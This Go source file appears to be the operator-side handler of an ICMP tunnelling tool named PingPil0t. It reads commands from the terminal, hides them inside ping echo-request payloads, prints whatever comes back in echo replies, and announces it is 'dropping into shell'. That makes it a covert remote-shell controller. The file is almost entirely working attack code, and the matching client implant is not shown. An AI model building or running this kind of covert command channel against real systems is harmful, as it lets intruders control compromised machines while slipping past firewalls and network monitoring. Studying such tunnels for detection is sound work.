package handlers 

// Server Implementation 

import (
  "os"
  "fmt"
  "net"
  "log"
  "bufio"
  "os/signal"
  "PingPil0t/utils"
  "golang.org/x/net/icmp"
  "golang.org/x/net/ipv4"
)

const (
  icmpProtocol = 1
)

// func to handle icmp echo replies from client 
func handleEchoReply(conn *icmp.PacketConn) {
  buffer := make([]byte, 1024)

  for {
    n, _, err := conn.ReadFrom(buffer)
    if err != nil {
      log.Println("[!] Error reading from connection:", err)
      continue
    }

    msg, err := icmp.ParseMessage(icmpProtocol, buffer[:n])
    if err != nil {
      log.Println("[!] Error parsing ICMP message:", err)
      continue
    }

    switch msg.Type {
    case ipv4.ICMPTypeEchoReply:
      fmt.Println(string(msg.Body.(*icmp.Echo).Data)) 
    default:
      continue 
    }
  } 
}

// func to handle icmp echo requests for server
func sendEchoRequest(conn *icmp.PacketConn, ifaceAddr string, cmd string) {
  msg := icmp.Message {
    Type: ipv4.ICMPTypeEcho, 
    Code: 0,
    Body: &icmp.Echo {
      ID: os.Getpid() & 0xffff,
      Seq: 1,
      Data: []byte(cmd),
    },
  }
  
  packet, err := msg.Marshal(nil)
  if err != nil {
    log.Println("[!] Error marshaling ICMP echo reply:", err)
    return
  }

  _, err = conn.WriteTo(packet, &net.IPAddr{IP: net.ParseIP(ifaceAddr)}) 
  if err != nil {
    log.Println("[!] Error marshaling ICMP echo request:", err)
    return
  }
}

// func to handle server specific actions  
func StartServer(iface string) {
 
 fmt.Print("\n[+] Starting server")
 ifaceAddr := utils.ResolveInterfaceIP(iface)
 
 conn, err := icmp.ListenPacket("ip4:icmp", ifaceAddr)
 if err != nil {
   log.Fatal("[!] Error listening for ICMP packets:", err)
 }
 defer conn.Close()

 fmt.Println(" => 0k!")

 fmt.Println("[*] Droping into shell!")
 
 c := make(chan os.Signal)
 signal.Notify(c, os.Interrupt)

 go func(){
   <-c 
   fmt.Println("\n[!] Shutting down server!")
   os.Exit(0)
 }()

 go handleEchoReply(conn)
 
 scanner := bufio.NewScanner(os.Stdin)

 for {
   if scanner.Scan() {
     cmd := scanner.Text()
     sendEchoRequest(conn, ifaceAddr, cmd)
   } else {
     log.Println("[!] Error while reading input!")
     continue
  } 
 }
}
